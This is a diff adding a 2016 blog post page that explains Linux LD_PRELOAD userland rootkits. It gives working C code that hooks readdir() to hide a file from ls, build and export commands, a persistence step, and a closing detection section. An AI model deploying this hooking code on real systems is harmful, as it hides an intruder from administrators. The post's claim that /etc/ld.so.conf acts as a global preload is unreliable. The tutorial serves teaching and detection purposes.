@@ -1,0 +1,304 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="What are rootkits anyways?Rootkits are set of programs that allows someone to manipulate behavior of the host operating system without revealing his or her presence. They are often used by attackers t">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Overview on Linux userland rootkits">
+<meta property="og:url" content="http://ketansingh.net/overview-on-linux-userland-rootkits/index.html">
+<meta property="og:site_name" content="Ketansingh.net">
+<meta property="og:description" content="What are rootkits anyways?Rootkits are set of programs that allows someone to manipulate behavior of the host operating system without revealing his or her presence. They are often used by attackers t">
+<meta property="og:image" content="https://i.imgur.com/JF1vN9f.png">
+<meta property="og:updated_time" content="2016-09-10T12:12:33.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Overview on Linux userland rootkits">
+<meta name="twitter:description" content="What are rootkits anyways?Rootkits are set of programs that allows someone to manipulate behavior of the host operating system without revealing his or her presence. They are often used by attackers t">
+<meta name="twitter:image" content="https://i.imgur.com/JF1vN9f.png">
+<meta name="twitter:creator" content="@http://twitter.com/sh_ketan">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>Overview on Linux userland rootkits</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+    <link rel="stylesheet" href="/lib/meslo-LG/styles.css">
+    <link rel="stylesheet" href="/lib/justified-gallery/justifiedGallery.min.css">
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- rss -->
+    
+    
+    <!-- jquery -->
+    <script src="/lib/jquery/jquery.min.js"></script>
+</head>
+
+<body>
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fa fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fa fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="http://github.com/spl0i7">Projects</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/setting-proxy-for-archlinux/"><i class="fa fa-chevron-left" aria-hidden="true" onmouseover='$("#i-prev").toggle();' onmouseout='$("#i-prev").toggle();'></i></a></li>
+        
+        
+        <li><a class="icon" href="/keylogger-for-mozilla-firefox/"><i class="fa fa-chevron-right" aria-hidden="true" onmouseover='$("#i-next").toggle();' onmouseout='$("#i-next").toggle();'></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up" aria-hidden="true" onmouseover='$("#i-top").toggle();' onmouseout='$("#i-top").toggle();'></i></a></li>
+        <li><a class="icon" href="#"><i class="fa fa-share-alt" aria-hidden="true" onmouseover='$("#i-share").toggle();' onmouseout='$("#i-share").toggle();' onclick='$("#share").toggle();return false;'></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://ketansingh.net/overview-on-linux-userland-rootkits/"><i class="fa fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://ketansingh.net/overview-on-linux-userland-rootkits/&text=Overview on Linux userland rootkits"><i class="fa fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://ketansingh.net/overview-on-linux-userland-rootkits/&title=Overview on Linux userland rootkits"><i class="fa fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://ketansingh.net/overview-on-linux-userland-rootkits/&is_video=false&description=Overview on Linux userland rootkits"><i class="fa fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Overview on Linux userland rootkits&body=Check out this article: http://ketansingh.net/overview-on-linux-userland-rootkits/"><i class="fa fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://ketansingh.net/overview-on-linux-userland-rootkits/&title=Overview on Linux userland rootkits"><i class="fa fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://ketansingh.net/overview-on-linux-userland-rootkits/&title=Overview on Linux userland rootkits"><i class="fa fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://ketansingh.net/overview-on-linux-userland-rootkits/&title=Overview on Linux userland rootkits"><i class="fa fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://ketansingh.net/overview-on-linux-userland-rootkits/&title=Overview on Linux userland rootkits"><i class="fa fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://ketansingh.net/overview-on-linux-userland-rootkits/&name=Overview on Linux userland rootkits&description="><i class="fa fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#What-are-rootkits-anyways"><span class="toc-number">1.</span> <span class="toc-text">What are rootkits anyways?</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#So-How-do-they-work"><span class="toc-number">2.</span> <span class="toc-text">So, How do they work?</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#i-Replacing-binaries-with-malicious-version"><span class="toc-number">2.0.1.</span> <span class="toc-text">(i) Replacing binaries with malicious version.</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ii-Inserting-malicious-shared-library-on-victim-machine"><span class="toc-number">2.0.2.</span> <span class="toc-text">(ii) Inserting malicious shared library on victim machine</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#What-is-shared-library"><span class="toc-number">2.1.</span> <span class="toc-text">What is shared library?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#LD-PRELOAD-in-action"><span class="toc-number">2.2.</span> <span class="toc-text">LD_PRELOAD in action</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index width mx-auto px2 my4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        Overview on Linux userland rootkits
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Ketansingh.net</span>
+      </span>
+      
+    <div class="postdate">
+        <time datetime="2016-09-08T07:01:35.000Z" itemprop="datePublished">2016-09-08</time>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa fa-tag"></i>
+        <a class="tag-link" href="/tags/C/">C</a>, <a class="tag-link" href="/tags/linux/">linux</a>, <a class="tag-link" href="/tags/rootkit/">rootkit</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h1 id="What-are-rootkits-anyways"><a href="#What-are-rootkits-anyways" class="headerlink" title="What are rootkits anyways?"></a>What are rootkits anyways?</h1><p>Rootkits are set of programs that allows someone to manipulate behavior of the host operating system without revealing his or her presence. They are often used by attackers to maintain access on victim machines without setting off any alarm. They come at play in post exploitation phase of an attack. That being said, not all rootkits are malicious. <a href="https://wiki.freebsd.org/DTrace" target="_blank" rel="external">Dtrace</a> , a framework for performance analysis and debugging in real time included in FreeBSD can be considered a “good rootkit” because of the way its designed to work.</p>
+<p>Rootkits can be classified into</p>
+<p><strong>i) Kernel mode</strong> - Rootkits which can alter kernel’s internal data structures and manipulate it’s behavior.</p>
+<p><strong>ii) Usermode rootkit</strong> - Rootkits which modify operating system functions at user-level like modifying programs , libraries or maybe registry hives in windows.</p>
+<h1 id="So-How-do-they-work"><a href="#So-How-do-they-work" class="headerlink" title="So, How do they work?"></a>So, How do they work?</h1><p>Today, we’re gonna take a look at Linux userland rootkits (Maybe windows next time?). There are many ways to load linux rootkit but popular technique involve</p>
+<h3 id="i-Replacing-binaries-with-malicious-version"><a href="#i-Replacing-binaries-with-malicious-version" class="headerlink" title="(i) Replacing binaries with malicious version."></a>(i) Replacing binaries with malicious version.</h3><p>This method involves replacing system utilities like <strong>ls</strong>, <strong>top</strong>,<strong>ps</strong>, etc with their malicious counterpart. These malicious version of utilities can hide files, processes and sockets but this method sucks. Why? Because it raises too much suspicion. Host based intrusion detection systems will instantly alert admin about change in cryptographic checksum of binaries. Almost all modern HIDS do checksum of system files at regular interval. So, detection is inevitable by this method if proper security measures are in place. This also sucks because we’ll need to write malicious version for every system utilities we need hook for (hook means modified functions) , which involves too  much work. What if we can just mess up C library functions somehow ? We won’t need to write malicious version of every utility just malicious version of C library functions and every utility would be affected by it.</p>
+<h3 id="ii-Inserting-malicious-shared-library-on-victim-machine"><a href="#ii-Inserting-malicious-shared-library-on-victim-machine" class="headerlink" title="(ii) Inserting malicious shared library on victim machine"></a>(ii) Inserting malicious shared library on victim machine</h3><p>Before going any further we need to clear a few things about shared libraries.</p>
+<h2 id="What-is-shared-library"><a href="#What-is-shared-library" class="headerlink" title="What is shared library?"></a>What is shared library?</h2><p>Shared libraries are very much like a program that never gets started. They have code and data sections (functions and variables) just like every executable; but no where to start . They usually have <strong>.so</strong> extension in Linux or <strong>.dll</strong> in windows. They just provide a library of functions for programmers to call. When we compile our program that uses a dynamic library, object files are left with references to the library functions. Shared libraries provide flexibility to the development environment as the library code can be changed, modified and recompiled without having to re-compile the applications that use this library.</p>
+<p>The programs <strong>ld.so</strong> and <strong>ld-linux.so</strong> find and load the shared libraries needed by a program, prepare the program to run, and then run it unless program was statically linked. Dynamic linker tries to load shared library (*.so) from :</p>
+<ul>
+<li>directories listed in the <em>LD_LIBRARY_PATH</em> environment variable.</li>
+<li>directories listed in the executable’s rpath.</li>
+<li>directories on the system search path, which consists of the entries in <strong>/etc/ld.so.conf</strong> plus <strong>/lib</strong> and <strong>/usr/lib</strong></li>
+</ul>
+<p>We can see what dynamic libraries are loaded by a program <strong>ls</strong> using <strong>ldd</strong> utility</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">$ ldd $(<span class="built_in">which</span> ls)</div><div class="line"></div><div class="line">linux-vdso.so.1 =&gt;  (0x00007ffff50fb000)</div><div class="line">libselinux.so.1 =&gt; /lib/x86_64-linux-gnu/libselinux.so.1 (0x00007fb8b52f0000)</div><div class="line">libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb8b4f20000)</div><div class="line">libpcre.so.3 =&gt; /lib/x86_64-linux-gnu/libpcre.so.3 (0x00007fb8b4ca0000)</div><div class="line">libdl.so.2 =&gt; /lib/x86_64-linux-gnu/libdl.so.2 (0x00007fb8b4a90000)</div><div class="line">/lib64/ld-linux-x86-64.so.2 (0x00007fb8b5600000)</div><div class="line">libpthread.so.0 =&gt; /lib/x86_64-linux-gnu/libpthread.so.0 (0x00007fb8b4870000)</div></pre></td></tr></table></figure>
+<p>This is where environment variable called <em>LD_PRELOAD</em> comes into play. If we set <em>LD_PRELOAD</em> to the path of a shared object, that file will be loaded before any other library (including the C runtime, libc.so). We can even implement our own libc functions using this.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ LD_PRELOAD=/path/to/mylib.so /bin/ls</div></pre></td></tr></table></figure>
+<h2 id="LD-PRELOAD-in-action"><a href="#LD-PRELOAD-in-action" class="headerlink" title="LD_PRELOAD in action"></a>LD_PRELOAD in action</h2><p>To show how this can be misused , let’s try to hide something called <strong>rootkit.txt</strong> from <strong>ls</strong>. Let’s start by taking a look into <strong>ls</strong> source code. This utility is part of GNU coreutils on linux and part busybox on Android. To hide this file we must understand how <strong>ls</strong> reads file names. We can read directory in linux programmatically with <a href="http://linux.die.net/man/3/readdir" target="_blank" rel="external"><em>readdir()</em></a> as defined in standard C library or <a href="http://man7.org/linux/man-pages/man2/getdents.2.html" target="_blank" rel="external"><em>getdents()</em></a> which is a syscall. A quick grep into <a href="http://git.savannah.gnu.org/cgit/coreutils.git/tree/src/ls.c" target="_blank" rel="external">ls.c</a> source code tells us that there’s no use of <em>getdents()</em> while <em>readdir()</em> is used to list out files. Code looks something like<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">....</div><div class="line"><span class="keyword">while</span> (<span class="number">1</span>)</div><div class="line">    &#123;</div><div class="line">      <span class="comment">/* Set errno to zero so we can distinguish between a readdir failure</span></div><div class="line">         and when readdir simply finds that there are no more entries.  */</div><div class="line">      errno = <span class="number">0</span>;</div><div class="line">      next = readdir (dirp);</div><div class="line">      <span class="keyword">if</span> (next)</div><div class="line">        &#123;</div><div class="line">          <span class="keyword">if</span> (! file_ignored (next-&gt;d_name))</div><div class="line">            &#123;</div><div class="line">              <span class="keyword">enum</span> filetype type = unknown;</div><div class="line">.....</div></pre></td></tr></table></figure></p>
+<p>Now we just need to hook readdir() to hide <strong>rootkit.txt</strong>. Here’s the code to do it.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">define</span> SECRET <span class="meta-string">"rootkit.txt"</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;dlfcn.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;dirent.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="keyword">struct</span> dirent *(*o_readdir)(DIR *);</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">struct</span> dirent *<span class="title">readdir</span><span class="params">(DIR *dirp)</span> </span>&#123;</div><div class="line">   <span class="keyword">struct</span> dirent *ret;</div><div class="line"></div><div class="line">   <span class="keyword">void</span> *libc = dlopen(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>, RTLD_LAZY);</div><div class="line">   o_readdir = dlsym (libc, <span class="string">"readdir"</span>);</div><div class="line"></div><div class="line">   <span class="keyword">while</span>((ret = o_readdir(dirp)))&#123;</div><div class="line">      <span class="keyword">if</span>(<span class="built_in">strstr</span>(ret-&gt;d_name,SECRET) == <span class="number">0</span> ) <span class="keyword">break</span>;</div><div class="line">   &#125;</div><div class="line"></div><div class="line">   <span class="keyword">return</span> ret;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>Code basically checks if file name is “rootkit.txt”, if not then return result of whatever <strong>readdir()</strong> returns else return nothing.</p>
+<p>Notice that we used <em>dlsym()</em> to get original <em>readdir()</em> (called o_readdir() ) from libc. Now, compile and link it</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ gcc -shared  <span class="_">-f</span>PIC -ldl hooked.c -o rootkit.so</div><div class="line">$ <span class="built_in">export</span> LD_PRELOAD=$(<span class="built_in">pwd</span>)<span class="string">"/rootkit.so"</span></div></pre></td></tr></table></figure>
+<p>and now create a dummy file to test</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ <span class="built_in">echo</span> <span class="string">"HIDE ME!! LOLZ"</span> &gt; rootkit.txt</div></pre></td></tr></table></figure>
+<p>and try to <strong>ls</strong> now</p>
+<p><img src="https://i.imgur.com/JF1vN9f.png" alt="hidden"></p>
+<p><strong>stat</strong> shows that file is still there, just “hidden”. We can even subvert <strong>stat</strong> to hide our file from it too. Not a big deal, now that we know how to get around hooking functions. We can also extend this idea to hide sockets and processes.</p>
+<p>But there’s still a problem. We need to set environment variable every time to load our malicious shared library. Even echoing out $LD_PRELOAD in shell will reveal we’re preloading some shared library and we also need to set it for every user on system. Quite a work? Isn’t?</p>
+<p>we can just add shared library path in <strong>/etc/ld.so.conf</strong> file which acts as “global” preload by </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ <span class="built_in">echo</span> $(<span class="built_in">pwd</span>)<span class="string">"/rootkit.so"</span> &gt;&gt; /etc/ld.so.conf</div></pre></td></tr></table></figure>
+<p>and hook other functions in c library to prevent this file from getting detected. This method too will create lot of suspicions if proper intrusion detection mechanism are in place but still better than former technique. Maybe next time we’ll try be more stealthy using kernel mode rootkits. </p>
+<p>####How to detected if you are victim?</p>
+<ul>
+<li><p>Check /proc/$BASHID/maps for suspicious looking loaded shared libraries.</p>
+</li>
+<li><p>Check output of <strong>ldd</strong> to see what shared objects a program uses.</p>
+</li>
+<li><p>Check $LD_PRELOAD environment variable.</p>
+</li>
+<li><p>Check what’s inside <strong>/etc/ld.so.conf</strong></p>
+</li>
+<li><p>We can compare address of functions from libc using <em>dlsym()</em> and address directly from program to check if it was hooked using</p>
+</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">...</div><div class="line"><span class="keyword">void</span> *libc = dlopen(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>, RTLD_LAZY); </div><div class="line"><span class="keyword">void</span> *(*libc_func)();</div><div class="line"><span class="keyword">void</span> *(*next_func)();</div><div class="line">libc_func = dlsym(libc, <span class="string">"readdir"</span>);</div><div class="line">next_func = dlsym(RTLD_NEXT, <span class="string">"readdir"</span>);</div><div class="line"><span class="keyword">if</span> (libc_func != next_func) &#123; </div><div class="line">    </div><div class="line">  <span class="comment">/*Hook detected*/</span></div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<ul>
+<li><p>Use some Intrusion detection system , I personally recommend [OSSEC HIDS]<br>(<a href="https://ossec.github.io/" target="_blank" rel="external">https://ossec.github.io/</a>)</p>
+</li>
+<li><p>Rootkit detection with <a href="https://www.sans.org/reading-room/whitepapers/detection/rootkit-detection-ossec-34555" target="_blank" rel="external">OSSEC</a></p>
+</li>
+</ul>
+<p>REFERENCES:</p>
+<ul>
+<li><a href="http://www.chokepoint.net/2014/02/detecting-userland-preload-rootkits.html" target="_blank" rel="external">http://www.chokepoint.net/2014/02/detecting-userland-preload-rootkits.html</a></li>
+<li><a href="http://code.metager.de/source/xref/gnu/coreutils/src/" target="_blank" rel="external">http://code.metager.de/source/xref/gnu/coreutils/src/</a></li>
+<li><a href="https://github.com/chokepoint/Jynx2" target="_blank" rel="external">https://github.com/chokepoint/Jynx2</a></li>
+<li><a href="http://fluxius.handgrep.se/2011/10/31/the-magic-of-ld_preload-for-userland-rootkits/" target="_blank" rel="external">http://fluxius.handgrep.se/2011/10/31/the-magic-of-ld_preload-for-userland-rootkits/</a></li>
+<li><a href="http://www.internetnews.com/security/article.php/3729486/Black+Hat+Dtrace+a+Rootkit.htm" target="_blank" rel="external">http://www.internetnews.com/security/article.php/3729486/Black+Hat+Dtrace+a+Rootkit.htm</a></li>
+</ul>
+
+  </div>
+</article>
+
+
+
+    </div>
+    
+      <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="http://github.com/spl0i7">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#What-are-rootkits-anyways"><span class="toc-number">1.</span> <span class="toc-text">What are rootkits anyways?</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#So-How-do-they-work"><span class="toc-number">2.</span> <span class="toc-text">So, How do they work?</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#i-Replacing-binaries-with-malicious-version"><span class="toc-number">2.0.1.</span> <span class="toc-text">(i) Replacing binaries with malicious version.</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ii-Inserting-malicious-shared-library-on-victim-machine"><span class="toc-number">2.0.2.</span> <span class="toc-text">(ii) Inserting malicious shared library on victim machine</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#What-is-shared-library"><span class="toc-number">2.1.</span> <span class="toc-text">What is shared library?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#LD-PRELOAD-in-action"><span class="toc-number">2.2.</span> <span class="toc-text">LD_PRELOAD in action</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://ketansingh.net/overview-on-linux-userland-rootkits/"><i class="fa fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://ketansingh.net/overview-on-linux-userland-rootkits/&text=Overview on Linux userland rootkits"><i class="fa fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://ketansingh.net/overview-on-linux-userland-rootkits/&title=Overview on Linux userland rootkits"><i class="fa fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://ketansingh.net/overview-on-linux-userland-rootkits/&is_video=false&description=Overview on Linux userland rootkits"><i class="fa fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Overview on Linux userland rootkits&body=Check out this article: http://ketansingh.net/overview-on-linux-userland-rootkits/"><i class="fa fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://ketansingh.net/overview-on-linux-userland-rootkits/&title=Overview on Linux userland rootkits"><i class="fa fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://ketansingh.net/overview-on-linux-userland-rootkits/&title=Overview on Linux userland rootkits"><i class="fa fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://ketansingh.net/overview-on-linux-userland-rootkits/&title=Overview on Linux userland rootkits"><i class="fa fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://ketansingh.net/overview-on-linux-userland-rootkits/&title=Overview on Linux userland rootkits"><i class="fa fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://ketansingh.net/overview-on-linux-userland-rootkits/&name=Overview on Linux userland rootkits&description="><i class="fa fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+      <ul>
+        <li id="toc"><a class="icon" href="#" onclick='$("#toc-footer").toggle();return false;'><i class="fa fa-list fa-lg" aria-hidden="true"></i> TOC</a></li>
+        <li id="share"><a class="icon" href="#" onclick='$("#share-footer").toggle();return false;'><i class="fa fa-share-alt fa-lg" aria-hidden="true"></i> Share</a></li>
+        <li id="top" style="display:none"><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a></li>
+        <li id="menu"><a class="icon" href="#" onclick='$("#nav-footer").toggle();return false;'><i class="fa fa-bars fa-lg" aria-hidden="true"></i> Menu</a></li>
+      </ul>
+    </div>
+
+  </div>
+</div>
+
+    
+    <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2017 Ketan Singh
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="http://github.com/spl0i7">Projects</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    <script src="/lib/justified-gallery/jquery.justifiedGallery.min.js"></script>
+<script src="/js/main.js"></script>
+<!-- Google Analytics -->
+
+    <script type="text/javascript">
+        (function(i,s,o,g,r,a,m) {i['GoogleAnalyticsObject']=r;i[r]=i[r]||function() {
+        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+        ga('create', 'UA-47868439-2', 'auto');
+        ga('send', 'pageview');
+    </script>
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
